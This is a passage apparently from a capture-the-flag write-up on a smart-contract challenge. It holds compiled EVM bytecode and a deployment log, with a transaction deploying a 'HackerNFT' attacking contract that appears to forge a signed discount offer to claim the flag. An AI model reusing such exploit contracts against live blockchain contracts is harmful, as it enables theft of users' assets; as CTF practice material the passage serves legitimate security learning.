405180910390fd5b565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036111df576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111d690612743565b60405180910390fd5b6111e881611700565b15611228576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161121f906127af565b60405180910390fd5b61123660008383600161177e565b61123f81611700565b1561127f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611276906127af565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46113896000838360016118a4565b5050565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036114c1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114b89061281b565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516115b29190611c5b565b60405180910390a3505050565b6115ca848484610df9565b6115d6848484846118aa565b611615576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161160c906128ad565b60405180910390fd5b50505050565b606060405180602001604052806000815250905090565b60606000600161164184611a31565b01905060008167ffffffffffffffff8111156116605761165f611f73565b5b6040519080825280601f01601f1916602001820160405280156116925781602001600182028036833780820191505090505b509050600082602001820190505b6001156116f5578080600190039150507f3031323334353637383961626364656600000000000000000000000000000000600a86061a8153600a85816116e9576116e86128cd565b5b049450600085036116a0575b819350505050919050565b60008073ffffffffffffffffffffffffffffffffffffffff1661172283611741565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600181111561189e57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146118125780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461180a919061292b565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161461189d5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254611895919061295f565b925050819055505b5b50505050565b50505050565b60006118cb8473ffffffffffffffffffffffffffffffffffffffff16611b84565b15611a24578373ffffffffffffffffffffffffffffffffffffffff1663150b7a026118f4610ca3565b8786866040518563ffffffff1660e01b815260040161191694939291906129e8565b6020604051808303816000875af192505050801561195257506040513d601f19601f8201168201806040525081019061194f9190612a49565b60015b6119d4573d8060008114611982576040519150601f19603f3d011682016040523d82523d6000602084013e611987565b606091505b5060008151036119cc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119c3906128ad565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611a29565b600190505b949350505050565b600080600090507a184f03e93ff9f4daa797ed6e38ed64bf6a1f0100000000000000008310611a8f577a184f03e93ff9f4daa797ed6e38ed64bf6a1f0100000000000000008381611a8557611a846128cd565b5b0492506040810190505b6d04ee2d6d415b85acef81000000008310611acc576d04ee2d6d415b85acef81000000008381611ac257611ac16128cd565b5b0492506020810190505b662386f26fc100008310611afb57662386f26fc100008381611af157611af06128cd565b5b0492506010810190505b6305f5e1008310611b24576305f5e1008381611b1a57611b196128cd565b5b0492506008810190505b6127108310611b49576127108381611b3f57611b3e6128cd565b5b0492506004810190505b60648310611b6c5760648381611b6257611b616128cd565b5b0492506002810190505b600a8310611b7b576001810190505b80915050919050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b6000604051905090565b600080fd5b600080fd5b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b611bf081611bbb565b8114611bfb57600080fd5b50565b600081359050611c0d81611be7565b92915050565b600060208284031215611c2957611c28611bb1565b5b6000611c3784828501611bfe565b91505092915050565b60008115159050919050565b611c5581611c40565b82525050565b6000602082019050611c706000830184611c4c565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015611cb0578082015181840152602081019050611c95565b60008484015250505050565b6000601f19601f8301169050919050565b6000611cd882611c76565b611ce28185611c81565b9350611cf2818560208601611c92565b611cfb81611cbc565b840191505092915050565b60006020820190508181036000830152611d208184611ccd565b905092915050565b6000819050919050565b611d3b81611d28565b8114611d4657600080fd5b50565b600081359050611d5881611d32565b92915050565b600060208284031215611d7457611d73611bb1565b5b6000611d8284828501611d49565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000611db682611d8b565b9050919050565b611dc681611dab565b82525050565b6000602082019050611de16000830184611dbd565b92915050565b611df081611dab565b8114611dfb57600080fd5b50565b600081359050611e0d81611de7565b92915050565b60008060408385031215611e2a57611e29611bb1565b5b6000611e3885828601611dfe565b9250506020611e4985828601611d49565b9150509250929050565b600080600060608486031215611e6c57611e6b611bb1565b5b6000611e7a86828701611dfe565b9350506020611e8b86828701611dfe565b9250506040611e9c86828701611d49565b9150509250925092565b600060208284031215611ebc57611ebb611bb1565b5b6000611eca84828501611dfe565b91505092915050565b611edc81611d28565b82525050565b6000602082019050611ef76000830184611ed3565b92915050565b611f0681611c40565b8114611f1157600080fd5b50565b600081359050611f2381611efd565b92915050565b60008060408385031215611f4057611f3f611bb1565b5b6000611f4e85828601611dfe565b9250506020611f5f85828601611f14565b9150509250929050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b611fab82611cbc565b810181811067ffffffffffffffff82111715611fca57611fc9611f73565b5b80604052505050565b6000611fdd611ba7565b9050611fe98282611fa2565b919050565b600067ffffffffffffffff82111561200957612008611f73565b5b61201282611cbc565b9050602081019050919050565b82818337600083830152505050565b600061204161203c84611fee565b611fd3565b90508281526020810184848401111561205d5761205c611f6e565b5b61206884828561201f565b509392505050565b600082601f83011261208557612084611f69565b5b813561209584826020860161202e565b91505092915050565b600080600080608085870312156120b8576120b7611bb1565b5b60006120c687828801611dfe565b94505060206120d787828801611dfe565b93505060406120e887828801611d49565b925050606085013567ffffffffffffffff81111561210957612108611bb6565b5b61211587828801612070565b91505092959194509250565b6000806040838503121561213857612137611bb1565b5b600061214685828601611dfe565b925050602061215785828601611dfe565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806121a857607f821691505b6020821081036121bb576121ba612161565b5b50919050565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b600061221d602183611c81565b9150612228826121c1565b604082019050919050565b6000602082019050818103600083015261224c81612210565b9050919050565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b60006122af603d83611c81565b91506122ba82612253565b604082019050919050565b600060208201905081810360008301526122de816122a2565b9050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b6000612341602d83611c81565b915061234c826122e5565b604082019050919050565b6000602082019050818103600083015261237081612334565b9050919050565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b60006123d3602983611c81565b91506123de82612377565b604082019050919050565b60006020820190508181036000830152612402816123c6565b9050919050565b600081905092915050565b600061241f82611c76565b6124298185612409565b9350612439818560208601611c92565b80840191505092915050565b60006124518285612414565b915061245d8284612414565b91508190509392505050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006124c5602683611c81565b91506124d082612469565b604082019050919050565b600060208201905081810360008301526124f4816124b8565b9050919050565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b6000612531601883611c81565b915061253c826124fb565b602082019050919050565b6000602082019050818103600083015261256081612524565b9050919050565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b60006125c3602583611c81565b91506125ce82612567565b604082019050919050565b600060208201905081810360008301526125f2816125b6565b9050919050565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000612655602483611c81565b9150612660826125f9565b604082019050919050565b6000602082019050818103600083015261268481612648565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b60006126c1602083611c81565b91506126cc8261268b565b602082019050919050565b600060208201905081810360008301526126f0816126b4565b9050919050565b7f4552433732313a206d696e7420746f20746865207a65726f2061646472657373600082015250565b600061272d602083611c81565b9150612738826126f7565b602082019050919050565b6000602082019050818103600083015261275c81612720565b9050919050565b7f4552433732313a20746f6b656e20616c7265616479206d696e74656400000000600082015250565b6000612799601c83611c81565b91506127a482612763565b602082019050919050565b600060208201905081810360008301526127c88161278c565b9050919050565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b6000612805601983611c81565b9150612810826127cf565b602082019050919050565b60006020820190508181036000830152612834816127f8565b9050919050565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b6000612897603283611c81565b91506128a28261283b565b604082019050919050565b600060208201905081810360008301526128c68161288a565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061293682611d28565b915061294183611d28565b9250828203905081811115612959576129586128fc565b5b92915050565b600061296a82611d28565b915061297583611d28565b925082820190508082111561298d5761298c6128fc565b5b92915050565b600081519050919050565b600082825260208201905092915050565b60006129ba82612993565b6129c4818561299e565b93506129d4818560208601611c92565b6129dd81611cbc565b840191505092915050565b60006080820190506129fd6000830187611dbd565b612a0a6020830186611dbd565b612a176040830185611ed3565b8181036060830152612a2981846129af565b905095945050505050565b600081519050612a4381611be7565b92915050565b600060208284031215612a5f57612a5e611bb1565b5b6000612a6d84828501612a34565b9150509291505056fea2646970667358221220fdbeed55f866252f7841c4221ee6ecd1be8f2bb2241a6226cc4156eea10c55fa64736f6c63430008100033</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>19.808</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>DeployContract</span><span class=p>:</span><span class=mi>418</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>DeployContract</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=mi>1200000000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>4260667</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0x60806040523480156200001157600080fd5b50604051620056f7380380620056f7833981810160405281019062000037919062000856565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cee092e86040518163ffffffff1660e01b8152600401602060405180830381865afa158015620000e3573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001099190620008cd565b600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a22cb46560008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016040518363ffffffff1660e01b8152600401620001c99291906200092d565b600060405180830381600087803b158015620001e457600080fd5b505af1158015620001f9573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663144c7cc76040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000269573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200028f91906200099f565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016200036e929190620009ec565b6020604051808303816000875af11580156200038e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620003b4919062000a4a565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632b7ac3f36040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000421573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000447919062000ac1565b600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1633604051620004da90620007de565b620004e89392919062000af3565b604051809103906000f08015801562000505573d6000803e3d6000fd5b50600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060016040518363ffffffff1660e01b8152600401620005a692919062000b7d565b600060405180830381600087803b158015620005c157600080fd5b505af1158015620005d6573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060026040518363ffffffff1660e01b81526004016200063a92919062000bed565b600060405180830381600087803b1580156200065557600080fd5b505af11580156200066a573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060036040518363ffffffff1660e01b8152600401620006ce92919062000c5d565b600060405180830381600087803b158015620006e957600080fd5b505af1158015620006fe573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a22cb4653360016040518363ffffffff1660e01b8152600401620007629291906200092d565b600060405180830381600087803b1580156200077d57600080fd5b505af115801562000792573d6000803e3d6000fd5b5050505033600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505062000c8a565b613463806200229483390190565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006200081e82620007f1565b9050919050565b620008308162000811565b81146200083c57600080fd5b50565b600081519050620008508162000825565b92915050565b6000602082840312156200086f576200086e620007ec565b5b60006200087f848285016200083f565b91505092915050565b6000620008958262000811565b9050919050565b620008a78162000888565b8114620008b357600080fd5b50565b600081519050620008c7816200089c565b92915050565b600060208284031215620008e657620008e5620007ec565b5b6000620008f684828501620008b6565b91505092915050565b6200090a8162000811565b82525050565b60008115159050919050565b620009278162000910565b82525050565b6000604082019050620009446000830185620008ff565b6200095360208301846200091c565b9392505050565b6000620009678262000811565b9050919050565b62000979816200095a565b81146200098557600080fd5b50565b60008151905062000999816200096e565b92915050565b600060208284031215620009b857620009b7620007ec565b5b6000620009c88482850162000988565b91505092915050565b6000819050919050565b620009e681620009d1565b82525050565b600060408201905062000a036000830185620008ff565b62000a126020830184620009db565b9392505050565b62000a248162000910565b811462000a3057600080fd5b50565b60008151905062000a448162000a19565b92915050565b60006020828403121562000a635762000a62620007ec565b5b600062000a738482850162000a33565b91505092915050565b600062000a898262000811565b9050919050565b62000a9b8162000a7c565b811462000aa757600080fd5b50565b60008151905062000abb8162000a90565b92915050565b60006020828403121562000ada5762000ad9620007ec565b5b600062000aea8482850162000aaa565b91505092915050565b600060608201905062000b0a6000830186620008ff565b62000b196020830185620008ff565b62000b286040830184620008ff565b949350505050565b6000819050919050565b6000819050919050565b600062000b6562000b5f62000b598462000b30565b62000b3a565b620009d1565b9050919050565b62000b778162000b44565b82525050565b600060408201905062000b946000830185620008ff565b62000ba3602083018462000b6c565b9392505050565b6000819050919050565b600062000bd562000bcf62000bc98462000baa565b62000b3a565b620009d1565b9050919050565b62000be78162000bb4565b82525050565b600060408201905062000c046000830185620008ff565b62000c13602083018462000bdc565b9392505050565b6000819050919050565b600062000c4562000c3f62000c398462000c1a565b62000b3a565b620009d1565b9050919050565b62000c578162000c24565b82525050565b600060408201905062000c746000830185620008ff565b62000c83602083018462000c4c565b9392505050565b6115fa8062000c9a6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c8063150b7a021461005c5780635ac174d01461008c578063772b508314610096578063bb3ee56d146100b4578063e4db78d7146100be575b600080fd5b61007660048036038101906100719190610c73565b6100da565b6040516100839190610d31565b60405180910390f35b6100946100ee565b005b61009e61033c565b6040516100ab9190610d65565b60405180910390f35b6100bc610492565b005b6100d860048036038101906100d39190610de5565b610652565b005b600063150b7a0260e01b9050949350505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635764950f600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016105396040518463ffffffff1660e01b815260040161017093929190610ec7565b600060405180830381600087803b15801561018a57600080fd5b505af115801561019e573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860016040518263ffffffff1660e01b81526004016101fc9190610efe565b600060405180830381600087803b15801561021657600080fd5b505af115801561022a573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860016040518263ffffffff1660e01b81526004016102889190610efe565b600060405180830381600087803b1580156102a257600080fd5b505af11580156102b6573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663473ca96c6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561032257600080fd5b505af1158015610336573d6000803e3d6000fd5b50505050565b6000806040518060600160405280600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001600381526020016001815250905060006040518060a001604052806003815260200160018152602001600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020013073ffffffffffffffffffffffffffffffffffffffff1681526020016040518060400160405280601081526020017f77616e7420746f2067657420666c61670000000000000000000000000000000081525081525090506000816040015182606001518484602001518560800151604051602001610471959493929190611194565b60405160208183030381529060405280519060200120905080935050505090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633884d6356040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104fc57600080fd5b505af1158015610510573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860006040518263ffffffff1660e01b815260040161056e919061128d565b600060405180830381600087803b15801561058857600080fd5b505af115801561059c573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016040518363ffffffff1660e01b815260040161061e9291906112a8565b600060405180830381600087803b15801561063857600080fd5b505af115801561064c573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001806040518463ffffffff1660e01b81526004016106d2939291906112d1565b6020604051808303816000875af11580156106f1573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610715919061131d565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360016040518463ffffffff1660e01b815260040161079793929190611385565b6020604051808303816000875af11580156107b6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107da919061131d565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001806040518463ffffffff1660e01b815260040161085b939291906112d1565b6020604051808303816000875af115801561087a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061089e919061131d565b5060006040518060600160405280600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001600381526020016001815250905060006040518060a001604052806003815260200160018152602001600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020013073ffffffffffffffffffffffffffffffffffffffff1681526020016040518060400160405280601081526020017f77616e7420746f2067657420666c6167000000000000000000000000000000008152508152509050600060405180604001604052808760ff16815260200160405180604001604052808881526020018781525081525090506000604051806040016040528084815260200183815250905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b40da948826040518263ffffffff1660e01b8152600401610a4a91906115a2565b600060405180830381600087803b158015610a6457600080fd5b505af1158015610a78573d6000803e3d6000fd5b5050505050505050505050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610ac482610a99565b9050919050565b610ad481610ab9565b8114610adf57600080fd5b50565b600081359050610af181610acb565b92915050565b6000819050919050565b610b0a81610af7565b8114610b1557600080fd5b50565b600081359050610b2781610b01565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b610b8082610b37565b810181811067ffffffffffffffff82111715610b9f57610b9e610b48565b5b80604052505050565b6000610bb2610a85565b9050610bbe8282610b77565b919050565b600067ffffffffffffffff821115610bde57610bdd610b48565b5b610be782610b37565b9050602081019050919050565b82818337600083830152505050565b6000610c16610c1184610bc3565b610ba8565b905082815260208101848484011115610c3257610c31610b32565b5b610c3d848285610bf4565b509392505050565b600082601f830112610c5a57610c59610b2d565b5b8135610c6a848260208601610c03565b91505092915050565b60008060008060808587031215610c8d57610c8c610a8f565b5b6000610c9b87828801610ae2565b9450506020610cac87828801610ae2565b9350506040610cbd87828801610b18565b925050606085013567ffffffffffffffff811115610cde57610cdd610a94565b5b610cea87828801610c45565b91505092959194509250565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b610d2b81610cf6565b82525050565b6000602082019050610d466000830184610d22565b92915050565b6000819050919050565b610d5f81610d4c565b82525050565b6000602082019050610d7a6000830184610d56565b92915050565b600060ff82169050919050565b610d9681610d80565b8114610da157600080fd5b50565b600081359050610db381610d8d565b92915050565b610dc281610d4c565b8114610dcd57600080fd5b50565b600081359050610ddf81610db9565b92915050565b600080600060608486031215610dfe57610dfd610a8f565b5b6000610e0c86828701610da4565b9350506020610e1d86828701610dd0565b9250506040610e2e86828701610dd0565b9150509250925092565b610e4181610ab9565b82525050565b6000819050919050565b6000819050919050565b6000610e76610e71610e6c84610e47565b610e51565b610af7565b9050919050565b610e8681610e5b565b82525050565b6000819050919050565b6000610eb1610eac610ea784610e8c565b610e51565b610af7565b9050919050565b610ec181610e96565b82525050565b6000606082019050610edc6000830186610e38565b610ee96020830185610e7d565b610ef66040830184610eb8565b949350505050565b6000602082019050610f136000830184610e7d565b92915050565b600082825260208201905092915050565b7f492c207468652069737375657200000000000000000000000000000000000000600082015250565b6000610f60600d83610f19565b9150610f6b82610f2a565b602082019050919050565b7f6f666665722061207370656369616c20646973636f756e7420666f7200000000600082015250565b6000610fac601c83610f19565b9150610fb782610f76565b602082019050919050565b7f746f206275790000000000000000000000000000000000000000000000000000600082015250565b6000610ff8600683610f19565b915061100382610fc2565b602082019050919050565b61101781610ab9565b82525050565b61102681610af7565b82525050565b606082016000820151611042600085018261100e565b506020820151611055602085018261101d565b506040820151611068604085018261101d565b50505050565b7f6174000000000000000000000000000000000000000000000000000000000000600082015250565b60006110a4600283610f19565b91506110af8261106e565b602082019050919050565b6110c381610af7565b82525050565b7f6265636175736500000000000000000000000000000000000000000000000000600082015250565b60006110ff600783610f19565b915061110a826110c9565b602082019050919050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561114f578082015181840152602081019050611134565b60008484015250505050565b600061116682611115565b6111708185611120565b9350611180818560208601611131565b61118981610b37565b840191505092915050565b60006101808201905081810360008301526111ae81610f53565b90506111bd6020830188610e38565b81810360408301526111ce81610f9f565b90506111dd6060830187610e38565b81810360808301526111ee81610feb565b90506111fd60a083018661102c565b81810361010083015261120f81611097565b905061121f6101208301856110ba565b818103610140830152611231816110f2565b9050818103610160830152611246818461115b565b90509695505050505050565b6000819050919050565b600061127761127261126d84611252565b610e51565b610af7565b9050919050565b6112878161125c565b82525050565b60006020820190506112a2600083018461127e565b92915050565b60006040820190506112bd6000830185610e38565b6112ca6020830184610e7d565b9392505050565b60006060820190506112e66000830186610e38565b6112f36020830185610e7d565b6113006040830184610e7d565b949350505050565b60008151905061131781610b01565b92915050565b60006020828403121561133357611332610a8f565b5b600061134184828501611308565b91505092915050565b6000819050919050565b600061136f61136a6113658461134a565b610e51565b610af7565b9050919050565b61137f81611354565b82525050565b600060608201905061139a6000830186610e38565b6113a76020830185611376565b6113b46040830184610e7d565b949350505050565b600082825260208201905092915050565b60006113d882611115565b6113e281856113bc565b93506113f2818560208601611131565b6113fb81610b37565b840191505092915050565b600060a08301600083015161141e600086018261101d565b506020830151611431602086018261101d565b506040830151611444604086018261100e565b506060830151611457606086018261100e565b506080830151848203608086015261146f82826113cd565b9150508091505092915050565b61148581610d80565b82525050565b600060029050919050565b600081905092915050565b6000819050919050565b6114b481610d4c565b82525050565b60006114c683836114ab565b60208301905092915050565b6000602082019050919050565b6114e88161148b565b6114f28184611496565b92506114fd826114a1565b8060005b8381101561152e57815161151587826114ba565b9650611520836114d2565b925050600181019050611501565b505050505050565b60608201600082015161154c600085018261147c565b50602082015161155f60208501826114df565b50505050565b600060808301600083015184820360008601526115828282611406565b91505060208301516115976020860182611536565b508091505092915050565b600060208201905081810360008301526115bc8184611565565b90509291505056fea2646970667358221220a7d65bb6c00aa70f0e2dc3f4bb9e8ae881b2558cfcb91c69c6225187e060130964736f6c6343000810003360806040523480156200001157600080fd5b50604051620034633803806200346383398181016040528101906200003791906200052d565b6040518060400160405280600981526020017f4861636b65724e465400000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f4e465400000000000000000000000000000000000000000000000000000000008152508160009081620000b4919062000803565b508060019081620000c6919062000803565b505050620000e9620000dd6200028460201b60201c565b6200028c60201b60201c565b82600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600a60006101000a81